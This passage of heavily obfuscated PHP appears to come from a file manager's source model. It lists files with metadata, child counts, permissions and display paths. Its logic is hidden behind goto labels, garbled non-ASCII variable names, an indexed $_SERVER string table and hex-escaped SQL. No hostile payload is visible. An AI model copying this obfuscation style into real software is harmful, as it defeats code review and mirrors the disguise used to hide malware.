$Bˆ…ˆÌŞ›¡[77] => $Bˆ…ˆÌŞ›¡[77], $Bˆ…ˆÌŞ›¡[167] => $Bˆ…ˆÌŞ›¡[390], $Bˆ…ˆÌŞ›¡[396] => $Bˆ…ˆÌŞ›¡[396], $Bˆ…ˆÌŞ›¡[423] => $Bˆ…ˆÌŞ›¡[397], $Bˆ…ˆÌŞ›¡[192] => $Bˆ…ˆÌŞ›¡[192], $Bˆ…ˆÌŞ›¡[83] => $Bˆ…ˆÌŞ›¡[83]); $EŒÂÛÃøÇ = Input::get($Bˆ…ˆÌŞ›¡[424], $Bˆ…ˆÌŞ›¡[7], $eÆæğ”í, array_keys($DÀã´›èÜÈ)); goto fæÇèƒâÚ; fæÇèƒâÚ: $cŞ¡éÊÑòß = Input::get($Bˆ…ˆÌŞ›¡[425], $Bˆ…ˆÌŞ›¡[7], $bè¹ºñ¾˜, array_keys($BÓ»©àŒîÖ)); if (!in_array($EŒÂÛÃøÇ, array_keys($DÀã´›èÜÈ))) { $EŒÂÛÃøÇ = $Bˆ…ˆÌŞ›¡[28]; } if (!in_array($cŞ¡éÊÑòß, array_keys($BÓ»©àŒîÖ))) { $EŒÂÛÃøÇ = $Bˆ…ˆÌŞ›¡[419]; } goto f‚Ê±ç™‡‡; B‚¸à—ñ¹Ú: $Bˆ…ˆÌŞ›¡ =& $_SERVER[òÀöí]; $eÆæğ”í = Model($Bˆ…ˆÌŞ›¡[416])->get($Bˆ…ˆÌŞ›¡[417]); $bè¹ºñ¾˜ = Model($Bˆ…ˆÌŞ›¡[416])->get($Bˆ…ˆÌŞ›¡[418]); goto C¾×ã¨»ùÇ; A¨ô¿çˆñ·: } protected function _listDataApplyItem($cÓ¼ÙÃˆ˜, $B» —ËÎ‹Ä = false) { $aŞ÷çß©…¥ = array($cÓ¼ÙÃˆ˜); $this->_listDataApply($aŞ÷çß©…¥, $B» —ËÎ‹Ä); return $aŞ÷çß©…¥[0]; } protected function _listDataApply(&$aÍõß±§², $BòàìÂŸ³½ = false) { goto CÄÁˆµ·ì; A‘ó›Í©·î: $EİÁÖ”„Ñè = array_unique($EİÁÖ”„Ñè); $this->_listSourceCache($aÍõß±§²); if (!$BòàìÂŸ³½) { $this->_listAppendMeta($aÍõß±§², $EİÁÖ”„Ñè); $this->_listAppendFileMeta($aÍõß±§², $EİÁÖ”„Ñè); $this->_listAppendChildren($aÍõß±§², $EİÁÖ”„Ñè); } goto Eƒ¤©ëëØ; Eƒ¤©ëëØ: $this->_listAppendPath($aÍõß±§²); $this->_listAppendAuth($aÍõß±§²); $this->_listAppendSourceInfo($aÍõß±§², $EİÁÖ”„Ñè); goto eÖò¤ øœŞ; CÄÁˆµ·ì: $b×’ß»Ï©ˆ =& $_SERVER[òÀöí]; if (!$aÍõß±§²) { $aÍõß±§² = array(); return; } $EİÁÖ”„Ñè = array_to_keyvalue($aÍõß±§², $b×’ß»Ï©ˆ[33], $b×’ß»Ï©ˆ[387]); goto A‘ó›Í©·î; eÖò¤ øœŞ: $this->_listAppendUser($aÍõß±§²); $this->_listFilterInfo($aÍõß±§², $BòàìÂŸ³½); goto Aù‰åâëœÚ; Aù‰åâëœÚ: } protected function _listSourceCache($e–èÜŠ¬Á¥) { $AÛâ÷İ—Ø =& $_SERVER[òÀöí]; foreach ($e–èÜŠ¬Á¥ as $aßãù§ìµ) { self::$cacheSourceInfo[$AÛâ÷İ—Ø[427] . $aßãù§ìµ[$AÛâ÷İ—Ø[387]]] = $aßãù§ìµ; } } protected function _listFilterInfo(&$e‘‘‚Û­ÁÚ, $aÓœœù–Ú = false) { $F«µÊ¶·¥¹ =& $_SERVER[òÀöí]; foreach ($e‘‘‚Û­ÁÚ as &$F´ŠâÀ•‰) { $F´ŠâÀ•‰ = $this->pathInfoFilter($F´ŠâÀ•‰); self::$cachePathInfo[$F«µÊ¶·¥¹[428] . intval($aÓœœù–Ú) . $F«µÊ¶·¥¹[429] . $F´ŠâÀ•‰[$F«µÊ¶·¥¹[387]]] = $F´ŠâÀ•‰; } unset($F´ŠâÀ•‰); } protected function _listMake(&$aÛ‹©·Í‘) { $F¸ì´½œÌ² =& $_SERVER[òÀöí]; $aÛ‹©·Í‘[$F¸ì´½œÌ²[74]] = array(); $aÛ‹©·Í‘[$F¸ì´½œÌ²[73]] = array(); foreach ($aÛ‹©·Í‘[$F¸ì´½œÌ²[363]] as $c‡Ÿ›Ù¤´º) { $a­±í¥àĞé = $c‡Ÿ›Ù¤´º[$F¸ì´½œÌ²[388]] == 1 ? $F¸ì´½œÌ²[74] : $F¸ì´½œÌ²[73]; $aÛ‹©·Í‘[$a­±í¥àĞé][] = $c‡Ÿ›Ù¤´º; } unset($aÛ‹©·Í‘[$F¸ì´½œÌ²[363]]); } protected function _listAppendMeta(&$d»ƒ°¯¯, $d‰©ïŠÃ©Ç) { goto EÛÃ”Ø¯ÑÆ; EÛÃ”Ø¯ÑÆ: $F„ŒÃô›Ä =& $_SERVER[òÀöí]; $b“‚ÆÓÅší = array($F„ŒÃô›Ä[401] => array($F„ŒÃô›Ä[402], $d‰©ïŠÃ©Ç)); $cŒˆ¬ïáª¸ = Model($F„ŒÃô›Ä[430])->field($F„ŒÃô›Ä[431])->where($b“‚ÆÓÅší)->select(); goto Bˆœ‰çÔ•; Eğ¡¶Ôë„ö: foreach ($cŒˆ¬ïáª¸ as $aÌ«¾Õ· Ì) { if (!isset($b‡îÕŒåÉ[$aÌ«¾Õ· Ì[$F„ŒÃô›Ä[387]]])) { $b‡îÕŒåÉ[$aÌ«¾Õ· Ì[$F„ŒÃô›Ä[387]]] = array(); } if (in_array($aÌ«¾Õ· Ì[$F„ŒÃô›Ä[92]], $D‚Ò‚äğ¨•)) { continue; } $b‡îÕŒåÉ[$aÌ«¾Õ· Ì[$F„ŒÃô›Ä[387]]][$aÌ«¾Õ· Ì[$F„ŒÃô›Ä[92]]] = $aÌ«¾Õ· Ì[$F„ŒÃô›Ä[368]]; } foreach ($d»ƒ°¯¯ as &$e‡Ş¥Å‚å¯) { $e‡Ş¥Å‚å¯[$F„ŒÃô›Ä[434]] = !1; if (isset($b‡îÕŒåÉ[$e‡Ş¥Å‚å¯[$F„ŒÃô›Ä[387]]])) { $e‡Ş¥Å‚å¯[$F„ŒÃô›Ä[434]] = $b‡îÕŒåÉ[$e‡Ş¥Å‚å¯[$F„ŒÃô›Ä[387]]]; } if ($this->fileIsLock($e‡Ş¥Å‚å¯) && $e‡Ş¥Å‚å¯[$F„ŒÃô›Ä[394]]) { $d¾Ò«Å³áœ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $e‡Ş¥Å‚å¯[$F„ŒÃô›Ä[394]][$F„ŒÃô›Ä[395]] = AuthModel::authDisable($e‡Ş¥Å‚å¯[$F„ŒÃô›Ä[394]][$F„ŒÃô›Ä[395]], $d¾Ò«Å³áœ); $e‡Ş¥Å‚å¯[$F„ŒÃô›Ä[394]][$F„ŒÃô›Ä[435]][$F„ŒÃô›Ä[394]] = $e‡Ş¥Å‚å¯[$F„ŒÃô›Ä[394]][$F„ŒÃô›Ä[395]]; } } unset($e‡Ş¥Å‚å¯); goto fÒÒßø‘ê›; Bˆœ‰çÔ•: if (!$cŒˆ¬ïáª¸) { return; } $D‚Ò‚äğ¨• = array($F„ŒÃô›Ä[432], $F„ŒÃô›Ä[433]); $b‡îÕŒåÉ = array(); goto Eğ¡¶Ôë„ö; fÒÒßø‘ê›: } protected function _listAppendFileMeta(&$c®ğÑÎ¿¥, $c¤É¤Áö·) { goto f­«å¼¦®Í; fè…êñŒÎ¯: $Bë”ŠåÖè¾ = Model($fÜí×é¢ºÂ[439])->field($eÏ…Òá£íŸ)->where($a¸²—Âª÷—)->select(); $Bë”ŠåÖè¾ = array_to_keyvalue($Bë”ŠåÖè¾, $fÜí×é¢ºÂ[436]); $eîğëšœÏ = Model($fÜí×é¢ºÂ[440])->field($fÜí×é¢ºÂ[441])->where($a¸²—Âª÷—)->select(); goto eÕ©Š•—ÇÜ; eÁ‘ÊŠ·”è: if (!$D¦àÇ¶Ú—Ù) { return; } $a¸²—Âª÷— = array($fÜí×é¢ºÂ[437] => array($fÜí×é¢ºÂ[402], $D¦àÇ¶Ú—Ù)); $eÏ…Òá£íŸ = $fÜí×é¢ºÂ[438]; goto fè…êñŒÎ¯; eÕ©Š•—ÇÜ: $eîğëšœÏ = $eîğëšœÏ ? $eîğëšœÏ : array(); $DÄ…ÄÒ±×˜ = array(); foreach ($eîğëšœÏ as $Båê«º•Œ°) { if (!isset($DÄ…ÄÒ±×˜[$Båê«º•Œ°[$fÜí×é¢ºÂ[436]]])) { $DÄ…ÄÒ±×˜[$Båê«º•Œ°[$fÜí×é¢ºÂ[436]]] = array(); } $DÄ…ÄÒ±×˜[$Båê«º•Œ°[$fÜí×é¢ºÂ[436]]][$Båê«º•Œ°[$fÜí×é¢ºÂ[92]]] = $Båê«º•Œ°[$fÜí×é¢ºÂ[368]]; } goto bˆ…°Œˆ–á; bˆ…°Œˆ–á: foreach ($c®ğÑÎ¿¥ as &$FĞññÃø•) { goto cŒˆî½Ü‚; cŒˆî½Ü‚: $dºğ‡ùÁœŒ = $FĞññÃø•[$fÜí×é¢ºÂ[436]]; if (!$dºğ‡ùÁœŒ || !isset($Bë”ŠåÖè¾[$dºğ‡ùÁœŒ])) { continue; } $EŸÉç÷ŒÄä = $Bë”ŠåÖè¾[$dºğ‡ùÁœŒ]; goto b‘¼ˆ÷ºƒ¯; b‘¼ˆ÷ºƒ¯: $EŸÉç÷ŒÄä[$fÜí×é¢ºÂ[77]] = $FĞññÃø•[$fÜí×é¢ºÂ[77]]; $EŸÉç÷ŒÄä[$fÜí×é¢ºÂ[28]] = $FĞññÃø•[$fÜí×é¢ºÂ[28]]; if (!isset(self::$cacheFileInfo[$fÜí×é¢ºÂ[442] . $dºğ‡ùÁœŒ])) { self::$cacheFileInfo[$fÜí×é¢ºÂ[442] . $dºğ‡ùÁœŒ] = array_merge(array(), $EŸÉç÷ŒÄä); } goto dÂÈàÓÕó²; f½âç¶¦¼½: if (isset($FĞññÃø•[$fÜí×é¢ºÂ[163]][$fÜí×é¢ºÂ[162]])) { $FĞññÃø•[$fÜí×é¢ºÂ[162]] = json_decode($FĞññÃø•[$fÜí×é¢ºÂ[163]][$fÜí×é¢ºÂ[162]], !0); unset($FĞññÃø•[$fÜí×é¢ºÂ[163]][$fÜí×é¢ºÂ[162]]); } goto aóÕ§Ëš«; dÂÈàÓÕó²: unset($Bë”ŠåÖè¾[$dºğ‡ùÁœŒ][$fÜí×é¢ºÂ[75]]); $eøÔâƒè™÷ = is_array($DÄ…ÄÒ±×˜[$dºğ‡ùÁœŒ]) ? $DÄ…ÄÒ±×˜[$dºğ‡ùÁœŒ] : array(); $FĞññÃø•[$fÜí×é¢ºÂ[163]] = array_merge($eøÔâƒè™÷, $Bë”ŠåÖè¾[$dºğ‡ùÁœŒ]); goto f½âç¶¦¼½; aóÕ§Ëš«: } unset($FĞññÃø•); goto EÄ©áÌŒÄ½; f­«å¼¦®Í: $fÜí×é¢ºÂ =& $_SERVER[òÀöí]; $D¦àÇ¶Ú—Ù = array_to_keyvalue($c®ğÑÎ¿¥, $fÜí×é¢ºÂ[33], $fÜí×é¢ºÂ[436]); $D¦àÇ¶Ú—Ù = array_filter(array_unique($D¦àÇ¶Ú—Ù)); goto eÁ‘ÊŠ·”è; EÄ©áÌŒÄ½: } protected function _listAppendSourceInfo(&$F‘‹ÂÌÅ§¥, $a‡œ§˜Ï) { goto a±âöŒˆè; aƒÏ‰£¸¾³: $D¤ËĞµØø™ = array_to_keyvalue_group($a¯ÒàÏË, $fÎ‡±íïÃ‡[387]); foreach ($F‘‹ÂÌÅ§¥ as &$cİ§ùÍ‹Ëš) { $cİ§ùÍ‹Ëš[$fÎ‡±íïÃ‡[84]] = array($fÎ‡±íïÃ‡[446] => 0, $fÎ‡±íïÃ‡[447] => 0, $fÎ‡±íïÃ‡[448] => 0); if (isset($aÇŒ·›Áì[$cİ§ùÍ‹Ëš[$fÎ‡±íïÃ‡[387]]])) { $cİ§ùÍ‹Ëš[$fÎ‡±íïÃ‡[84]][$fÎ‡±íïÃ‡[449]] = 1; $cİ§ùÍ‹Ëš[$fÎ‡±íïÃ‡[84]][$fÎ‡±íïÃ‡[450]] = $aÇŒ·›Áì[$cİ§ùÍ‹Ëš[$fÎ‡±íïÃ‡[387]]][$fÎ‡±íïÃ‡[28]]; } if (isset($B™ğï…‰£[$cİ§ùÍ‹Ëš[$fÎ‡±íïÃ‡[387]]])) { $cİ§ùÍ‹Ëš[$fÎ‡±íïÃ‡[84]][$fÎ‡±íïÃ‡[451]] = array(); foreach ($B™ğï…‰£[$cİ§ùÍ‹Ëš[$fÎ‡±íïÃ‡[387]]] as $e’®Ì©ƒŸ–) { $Cˆ ¸·íÒé = $D—“éœìÉä[$e’®Ì©ƒŸ–]; $cİ§ùÍ‹Ëš[$fÎ‡±íïÃ‡[84]][$fÎ‡±íïÃ‡[451]][] = array($fÎ‡±íïÃ‡[452] => $Cˆ ¸·íÒé[$fÎ‡±íïÃ‡[385]], $fÎ‡±íïÃ‡[404] => $Cˆ ¸·íÒé[$fÎ‡±íïÃ‡[28]], $fÎ‡±íïÃ‡[453] => $Cˆ ¸·íÒé[$fÎ‡±íïÃ‡[454]]); } } if (isset($D¤ËĞµØø™[$cİ§ùÍ‹Ëš[$fÎ‡±íïÃ‡[387]]])) { $cİ§ùÍ‹Ëš[$fÎ‡±íïÃ‡[84]][$fÎ‡±íïÃ‡[455]] = array(); foreach ($D¤ËĞµØø™[$cİ§ùÍ‹Ëš[$fÎ‡±íïÃ‡[387]]] as $E‘‹‹ãˆ®) { $cİ§ùÍ‹Ëš[$fÎ‡±íïÃ‡[84]][$fÎ‡±íïÃ‡[455]] = array($fÎ‡±íïÃ‡[456] => $E‘‹‹ãˆ®[$fÎ‡±íïÃ‡[457]], $fÎ‡±íïÃ‡[458] => $E‘‹‹ãˆ®[$fÎ‡±íïÃ‡[459]], $fÎ‡±íïÃ‡[460] => $E‘‹‹ãˆ®[$fÎ‡±íïÃ‡[387]], $fÎ‡±íïÃ‡[461] => $E‘‹‹ãˆ®[$fÎ‡±íïÃ‡[462]], $fÎ‡±íïÃ‡[463] => $E‘‹‹ãˆ®[$fÎ‡±íïÃ‡[464]], $fÎ‡±íïÃ‡[465] => $E‘‹‹ãˆ®[$fÎ‡±íïÃ‡[465]], $fÎ‡±íïÃ‡[466] => $E‘‹‹ãˆ®[$fÎ‡±íïÃ‡[466]]); } } } unset($cİ§ùÍ‹Ëš); goto cÊ—¬©ñö; cÊ—¬©ñö: return $F‘‹ÂÌÅ§¥; goto d‰ë„Ù¾¥; Dà»‘÷Îù¹: $D—“éœìÉä = array_to_keyvalue($BæÂºëŠ¤õ, $fÎ‡±íïÃ‡[385]); $B™ğï…‰£ = array_to_keyvalue_group($A·Š®ê»‚à, $fÎ‡±íïÃ‡[75], $fÎ‡±íïÃ‡[410]); $aÇŒ·›Áì = array_to_keyvalue($BÑôÛÇÍÜ, $fÎ‡±íïÃ‡[75]); goto aƒÏ‰£¸¾³; CÓƒßí‡·Ö: $A·Š®ê»‚à = Model($fÎ‡±íïÃ‡[409])->listData(); $BÑôÛÇÍÜ = Model($fÎ‡±íïÃ‡[399])->listData(); $a¯ÒàÏË = Model($fÎ‡±íïÃ‡[445])->listSimple(); goto Dà»‘÷Îù¹; a±âöŒˆè: $fÎ‡±íïÃ‡ =& $_SERVER[òÀöí]; if (!defined($fÎ‡±íïÃ‡[443])) { return; } $BæÂºëŠ¤õ = Model($fÎ‡±íïÃ‡[444])->listData(); goto CÓƒßí‡·Ö; d‰ë„Ù¾¥: } protected function _listAppendChildren(&$c¥…àñÆğñ, $aîÓ³°ï÷ƒ) { goto b·‰ïØ¥³×; b·‰ïØ¥³×: $FìĞš“¨‰ =& $_SERVER[òÀöí]; $BîªŒùÉ¶‹ = $FìĞš“¨‰[370]; $BÀ´˜áë×™ = array(); goto D®É·Ø’ôå; Cì¾³Ìº‹Ú: foreach ($c¥…àñÆğñ as &$b¿Š…ÙóâÓ) { if ($b¿Š…ÙóâÓ[$FìĞš“¨‰[388]]) { unset($b¿Š…ÙóâÓ[$FìĞš“¨‰[390]]); $b¿Š…ÙóâÓ[$FìĞš“¨‰[202]] = intval($BÀ´˜áë×™[$b¿Š…ÙóâÓ[$FìĞš“¨‰[387]] . $FìĞš“¨‰[469]][$FìĞš“¨‰[470]]); $b¿Š…ÙóâÓ[$FìĞš“¨‰[201]] = intval($BÀ´˜áë×™[$b¿Š…ÙóâÓ[$FìĞš“¨‰[387]] . $FìĞš“¨‰[471]][$FìĞš“¨‰[470]]); } } unset($b¿Š…ÙóâÓ); goto cØéÛ˜åæ; f˜—”·Ç´Ç: $eİ¢ßéÇä = $this->tablePrefix . $this->tableName; for ($B·°¬Ì²´ = 0; $B·°¬Ì²´ < $e”‰ÛëÏªë; $B·°¬Ì²´++) { $AÀ£ìç…´ó = intval($c¥…àñÆğñ[$B·°¬Ì²´][$FìĞš“¨‰[414]]); if ($c¥…àñÆğñ[$B·°¬Ì²´][$FìĞš“¨‰[388]]) { $A ç“©¬Õ = $c¥…àñÆğñ[$B·°¬Ì²´][$FìĞš“¨‰[387]]; $BîªŒùÉ¶‹ .= "\123\105\114\105\x43\124\40\x2a\40\106\122\117\115\x20\x28\x53\105\114\105\103\124\40\47{$A ç“©¬Õ}\137\150\141\x73\x46\151\154\x65\x27\40\x61\163\40\x68\x61\163\x2c\143\157\x75\x6e\x74\x28\x31\x29\x20\141\163\40\x68\141\163\103\x6f\165\x6e\x74\40\106\x52\x4f\x4d\x20\x60{$eİ¢ßéÇä}\x60\x20\xa\x9\11\x9\x9\x9\167\150\145\x72\145\40\x70\x61\x72\x65\x6e\x74\111\104\x3d{$A ç“©¬Õ}\40\141\156\144\x20\151\163\x46\x6f\x6c\144\145\162\75\x30\x20\x61\x6e\144\40\x69\163\x44\145\x6c\x65\x74\x65\75{$AÀ£ìç…´ó}\x29\x20\x61\163\x20\164\x62\61\x5f{$A ç“©¬Õ}\x20\x75\x6e\151\x6f\156\40\x61\154\x6c\x20\12\x9\11\x9\11\11\x53\105\x4c\x45\103\x54\x20\52\40\x46\x52\117\x4d\x20\x28\123\x45\x4c\105\x43\124\x20\47{$A ç“©¬Õ}\137\150\141\x73\x46\157\154\144\x65\162\47\x20\141\163\40\x68\x61\x73\106\151\154\x65\x2c\x63\x6f\165\x6e\164\x28\x31\x29\x20\141\163\40\150\141\x73\103\x6f\x75\x6e\164\x20\x46\x52\x4f\115\40\140{$eİ¢ßéÇä}\x60\40\xa\11\11\x9\x9\x9\x77\150\145\x72\x65\40\x70\141\x72\145\156\164\111\104\75{$A ç“©¬Õ}\40\x61\x6e\144\x20\151\163\x46\x6f\x6c\144\145\162\75\x31\40\x61\156\x64\40\151\163\x44\145\x6c\145\x74\145\75{$AÀ£ìç…´ó}\x29\x20\x61\x73\40\164\142\62\137{$A ç“©¬Õ}\40\x75\x6e\x69\157\156\x20\141\x6c\154\40"; } if ((strlen($BîªŒùÉ¶‹) >= $bê’ÇÑá || $B·°¬Ì²´ == $e”‰ÛëÏªë - 1) && $BîªŒùÉ¶‹) { $BîªŒùÉ¶‹ = substr($BîªŒùÉ¶‹, 0, -strlen($FìĞš“¨‰[467])); $fÁÎº¾‰ó = $this->query($BîªŒùÉ¶‹); $BÀ´˜áë×™ = array_merge($BÀ´˜áë×™, $fÁÎº¾‰ó); $BîªŒùÉ¶‹ = $FìĞš“¨‰[33]; } } $BÀ´˜áë×™ = array_to_keyvalue($BÀ´˜áë×™, $FìĞš“¨‰[468]); goto Cì¾³Ìº‹Ú; D®É·Ø’ôå: $bê’ÇÑá = 1024 * 50; $c¥…àñÆğñ = is_array($c¥…àñÆğñ) ? $c¥…àñÆğñ : array(); $e”‰ÛëÏªë = count($c¥…àñÆğñ); goto f˜—”·Ç´Ç; cØéÛ˜åæ: } protected function _listAppendAuth(&$Cœ‘ç¹Ú§Ö) { goto DŠÀ‚½Öõë; F•¿–àœ™: foreach ($Cœ‘ç¹Ú§Ö as $eëİíİ¦Á) { if ($eëİíİ¦Á[$AªßÍÙ®µØ[389]] == self::TYPE_GROUP) { $C•›Ÿ¼ó˜×[] = $eëİíİ¦Á[$AªßÍÙ®µØ[387]]; } } if (!$C•›Ÿ¼ó˜×) { return; } $D²Ó…Ììî² = array_to_keyvalue($Cœ‘ç¹Ú§Ö, $AªßÍÙ®µØ[387]); goto f·å£À©â¬; DŠÀ‚½Öõë: $AªßÍÙ®µØ =& $_SERVER[òÀöí]; if (!defined($AªßÍÙ®µØ[443])) { return; } $C•›Ÿ¼ó˜× = array(); goto F•¿–àœ™; f·å£À©â¬: $D’×™õ¸ = Model($AªßÍÙ®µØ[472])->getSourceList($C•›Ÿ¼ó˜×, $D²Ó…Ììî²); foreach ($Cœ‘ç¹Ú§Ö as $F…´‘®³Àê => &$eëİíİ¦Á) { $eëİíİ¦Á[$AªßÍÙ®µØ[394]] = $D’×™õ¸[$eëİíİ¦Á[$AªßÍÙ®µØ[387]]]; if (!$eëİíİ¦Á[$AªßÍÙ®µØ[394]] && $eëİíİ¦Á[$AªßÍÙ®µØ[389]] == self::TYPE_GROUP) { $eëİíİ¦Á[$AªßÍÙ®µØ[394]] = Action($AªßÍÙ®µØ[473])->pathGroupAuthMake($eëİíİ¦Á[$AªßÍÙ®µØ[474]]); if (!$eëİíİ¦Á[$AªßÍÙ®µØ[394]] && !_get($GLOBALS, $AªßÍÙ®µØ[475])) { $eëİíİ¦Á[$AªßÍÙ®µØ[194]] = !1; $eëİíİ¦Á[$AªßÍÙ®µØ[193]] = !1; } } if ($eëİíİ¦Á[$AªßÍÙ®µØ[394]]) { $eëİíİ¦Á[$AªßÍÙ®µØ[194]] = AuthModel::authCheckEdit($eëİíİ¦Á[$AªßÍÙ®µØ[394]][$AªßÍÙ®µØ[395]]); $eëİíİ¦Á[$AªßÍÙ®µØ[193]] = AuthModel::authCheckView($eëİíİ¦Á[$AªßÍÙ®µØ[394]][$AªßÍÙ®µØ[395]]); } $this->groupPathDisplay($eëİíİ¦Á); } unset($eëİíİ¦Á); goto e÷Ÿ¡øêè…; e÷Ÿ¡øêè…: } public function groupPathDisplay(&$A–¨Õæ‘È) { goto Cí²Ãƒ—¼ï; Cí²Ãƒ—¼ï: $bŒì‰éš„æ =& $_SERVER[òÀöí]; if ($A–¨Õæ‘È[$bŒì‰éš„æ[389]] != self::TYPE_GROUP) { return; } $e¿ÌÊ×¢èá = Model($bŒì‰éš„æ[476])->getInfo($A–¨Õæ‘È[$bŒì‰éš„æ[474]]); goto F¾¡É†”±è; F¾¡É†”±è: $f«öŞà¶áé = $this->parentLevelArray($e¿ÌÊ×¢èá[$bŒì‰éš„æ[477]]); $aØæ„–×¾Ø = $bŒì‰éš„æ[33]; foreach ($f«öŞà¶áé as $F¬ÓîğÒš) { $CœÛ ¤ºÊÌ = Model($bŒì‰éš„æ[476])->getInfo($F¬ÓîğÒš); $aØæ„–×¾Ø .= $CœÛ ¤ºÊÌ[$bŒì‰éš„æ[84]][$bŒì‰éš„æ[387]] . $bŒì‰éš„æ[47]; } goto FŒ¯Çã¶Ó; B˜¥¾¿¯íĞ: $A–¨Õæ‘È[$bŒì‰éš„æ[482]] = $aØæ„–×¾Ø . $e¿ÌÊ×¢èá[$bŒì‰éš„æ[84]][$bŒì‰éš„æ[387]]; goto CõÅÖ•Ö‘¼; FŒ¯Çã¶Ó: $A–¨Õæ‘È[$bŒì‰éš„æ[478]] = $e¿ÌÊ×¢èá[$bŒì‰éš„æ[479]]; $A–¨Õæ‘È[$bŒì‰éš„æ[398]] = $e¿ÌÊ×¢èá[$bŒì‰éš„æ[477]]; $A–¨Õæ‘È[$bŒì‰éš„æ[480]] = $e¿ÌÊ×¢èá[$bŒì‰éš„æ[481]]; goto B˜¥¾¿¯íĞ; CõÅÖ•Ö‘¼: } protected function _listAppendPath(&$CåÈöâ»¹Ó) { goto E‡ˆ ÁŠ¢â; aÔ´È­‹ƒŒ: $BÙÊ™§ÔØ± = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($CåÈöâ»¹Ó as &$Bš„¯ÊÂÎË) { goto E»±ö·ó§; cÆ“Ğ©ß‚÷: $Cõ»ƒÌ²Ö = trim($Bš„¯ÊÂÎË[$FÁâªÀÀŒ‰[484]], $FÁâªÀÀŒ‰[8]); if ($Bš„¯ÊÂÎË[$FÁâªÀÀŒ‰[479]] == $FÁâªÀÀŒ‰[486] && $Cõ»ƒÌ²Ö) { $Bš„¯ÊÂÎË[$FÁâªÀÀŒ‰[28]] = $Cõ»ƒÌ²Ö; } $this->_listAppendPathRecycle($Bš„¯ÊÂÎË, $Fˆ§£ôÏ¢É, $BÙÊ™§ÔØ±); goto dØ’õ©š; A¶Ÿôó¹ª¨: if ($Fˆ§£ôÏ¢É) { $b˜‹İå‚Ó .= $Bš„¯ÊÂÎË[$FÁâªÀÀŒ‰[28]]; } if ($Bš„¯ÊÂÎË[$FÁâªÀÀŒ‰[388]]) { $b˜‹İå‚Ó .= $FÁâªÀÀŒ‰[8]; } $Bš„¯ÊÂÎË[$FÁâªÀÀŒ‰[484]] = str_replace($FÁâªÀÀŒ‰[485], $FÁâªÀÀŒ‰[8], $b˜‹İå‚Ó); goto cÆ“Ğ©ß‚÷; E»±ö·ó§: $Fˆ§£ôÏ¢É = $this->parentLevelArray($Bš„¯ÊÂÎË[$FÁâªÀÀŒ‰[477]]); $b˜‹İå‚Ó = $this->_listAppendPathRoot($Bš„¯ÊÂÎË, $Fˆ§£ôÏ¢É); foreach ($Fˆ§£ôÏ¢É as $B‚Œî©ÄÅ => $c¿ƒ¤‚½¸Ñ) { if ($B‚Œî©ÄÅ == 0 && $b˜‹İå‚Ó && $Bš„¯ÊÂÎË[$FÁâªÀÀŒ‰[389]] == self::TYPE_GROUP) { continue; } if (isset($C ¨ë¼†ô·[$c¿ƒ¤‚½¸Ñ])) { $b˜‹İå‚Ó .= $C ¨ë¼†ô·[$c¿ƒ¤‚½¸Ñ] . $FÁâªÀÀŒ‰[8]; } } goto A¶Ÿôó¹ª¨; dØ’õ©š: } unset($Bš„¯ÊÂÎË); goto A°‹‘˜À»¶; E‡ˆ ÁŠ¢â: $FÁâªÀÀŒ‰ =& $_SERVER[òÀöí]; static $C ¨ë¼†ô· = array(); $F©±ïˆ·›á = array(); goto c ‘æ¾›ÀÒ; A°‹‘˜À»¶: return $CåÈöâ»¹Ó; goto D˜‡®‡‘Û; c ‘æ¾›ÀÒ: foreach ($CåÈöâ»¹Ó as &$Bš„¯ÊÂÎË) { $C ¨ë¼†ô·[$Bš„¯ÊÂÎË[$FÁâªÀÀŒ‰[387]]] = $Bš„¯ÊÂÎË[$FÁâªÀÀŒ‰[28]]; $Fˆ§£ôÏ¢É = $this->parentLevelArray($Bš„¯ÊÂÎË[$FÁâªÀÀŒ‰[477]]); foreach ($Fˆ§£ôÏ¢É as $B‚Œî©ÄÅ => $c¿ƒ¤‚½¸Ñ) { if ($B‚Œî©ÄÅ != 0 && !isset($C ¨ë¼†ô·[$c¿ƒ¤‚½¸Ñ])) { $F©±ïˆ·›á[] = $c¿ƒ¤‚½¸Ñ; } } } unset($Bš„¯ÊÂÎË); if (count($F©±ïˆ·›á) > 0) { $bò†¨áïÑÔ = array($FÁâªÀÀŒ‰[401] => array($FÁâªÀÀŒ‰[402], $F©±ïˆ·›á)); if (count($F©±ïˆ·›á) == 1) { $A™Â÷İ¤ƒ¼ = $this->sourceInfo($F©±ïˆ·›á[0]); $b›ôŸÅä„ = is_array($A™Â÷İ¤ƒ¼) ? array($A™Â÷İ¤ƒ¼) : !1; } else { $b›ôŸÅä„ = $this->field($FÁâªÀÀŒ‰[483])->where($bò†¨áïÑÔ)->select(); } $eÆÌÍ¢ ‡ = array_to_keyvalue($b›ôŸÅä„, $FÁâªÀÀŒ‰[387], $FÁâªÀÀŒ‰[28]); $C ¨ë¼†ô· = array_merge_index($C ¨ë¼†ô·, $eÆÌÍ¢ ‡); } goto aÔ´È­‹ƒŒ; D˜‡®‡‘Û: } private function _listAppendPathRecycle(&$B¥ôöŒ ª“, $bœâºœ¡Ä‚, $aõ §óØç„) { goto bšÏ‘ŒºŞ; FÔ”â”šš‹: $dŒÙÊœ‘·„ = explode($a¬ĞÅ–à—[8], trim($B¥ôöŒ ª“[$a¬ĞÅ–à—[484]], $a¬ĞÅ–à—[8])); $AğÀØ¨À¯ = implode($a¬ĞÅ–à—[8], array_slice($dŒÙÊœ‘·„, 2)); $B¥ôöŒ ª“[$a¬ĞÅ–à—[484]] = $a¬ĞÅ–à—[8] . LNG($a¬ĞÅ–à—[487]) . $a¬ĞÅ–à—[8] . ltrim($AğÀØ¨À¯, $a¬ĞÅ–à—[8]); goto EíÒÚ—‰šÍ; EíÒÚ—‰šÍ: $B¥ôöŒ ª“[$a¬ĞÅ–à—[477]] = $a¬ĞÅ–à—[488] . implode($a¬ĞÅ–à—[47], array_slice($bœâºœ¡Ä‚, 1)) . $a¬ĞÅ–à—[47]; if ($B¥ôöŒ ª“[$a¬ĞÅ–à—[387]] == $aõ §óØç„) { $B¥ôöŒ ª“[$a¬ĞÅ–à—[477]] = $a¬ĞÅ–à—[488]; $B¥ôöŒ ª“[$a¬ĞÅ–à—[479]] = $a¬ĞÅ–à—[486]; $B¥ôöŒ ª“[$a¬ĞÅ–à—[28]] = LNG($a¬ĞÅ–à—[487]); } $B¥ôöŒ ª“[$a¬ĞÅ–à—[489]] = $a¬ĞÅ–à—[490]; goto A„êŞç»ôÎ; bšÏ‘ŒºŞ: 